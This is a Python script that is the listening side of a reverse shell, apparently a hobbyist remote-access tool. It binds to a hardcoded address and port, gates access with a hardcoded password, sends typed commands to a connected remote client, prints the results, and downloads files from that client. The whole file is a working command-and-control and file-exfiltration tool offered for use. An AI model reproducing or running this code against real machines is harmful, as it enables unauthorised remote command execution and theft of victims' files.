# -*- coding: utf-8 -*-
"""
Created on Sat Jun 12 00:32:25 2021

@author: Musya
"""
import warnings
import socket
import stdiomask
SERVER_HOST = "192.168.228.239"
SERVER_PORT = 6900
#SERVER_HOST = (input ("IP address: "))
#SERVER_PORT = int(input("PORT: "))
BUFFER_SIZE = 1024 * 128 # 128KB max size of messages, feel free to increase
# separator string for sending 2 messages in one go
SEPARATOR = "<sep>"
global trial
trial = 6

def login():
    global trial
    pwd = stdiomask.getpass()
    if pwd == '1234x':
        print("\n[+] Current working directory:", cwd)
        print(f"{client_address[0]}:{client_address[1]} Connected!")
        shell()
    else:
        trial = trial - 1
        if trial == 3:
            print("You must be guesing!")
        if trial == 0:
            print("Hint:12..x")
        login()

def shell():
    while True:
        try:
            
            global cwd
            # get the command from prompt
            command = input(f"{cwd} $>> ")
            if not command.strip():
                # empty command
                continue
            # send the command to the client
            client_socket.send(command.encode())
            if command.lower() == "kill":
                break
            if 'download' in command:
                grab, path = command.split('*')
                filename = path
                client_socket.send(command.encode())
                #save = input("Save as: ")
                f = open(filename, 'wb')
                print("waiting to rcv")
                i = client_socket.recv(1024)
                while not ('COMPLETE') in str(i):
                    f.write(i)
                    i = client_socket.recv(1024)
                f.close()
                client_socket.send(filename.encode())
                
            # retrieve command results
            output = client_socket.recv(BUFFER_SIZE).decode()
            # split command output and current directory
            results, cwd = output.split(SEPARATOR)
            # print output
            print(results)
        except ConnectionResetError  or ValueError:
            print("An existing connection was forcibly closed by the remote host")
        
# create a socket object
def start():
    
    global cwd, client_address, client_socket
    s = socket.socket()
    try: 
        # bind the socket to all IP addresses of this host
        s.bind((SERVER_HOST, SERVER_PORT))
    except OSError:
        print("Port Busy! Try another port")
        start()
    s.listen(5)
    print(f"Listening at {SERVER_HOST}:{SERVER_PORT} ...")
    # accept any connections attempted
    client_socket, client_address = s.accept()
    cwd = client_socket.recv(BUFFER_SIZE).decode()
    login()
warnings.filterwarnings("ignore")
start()

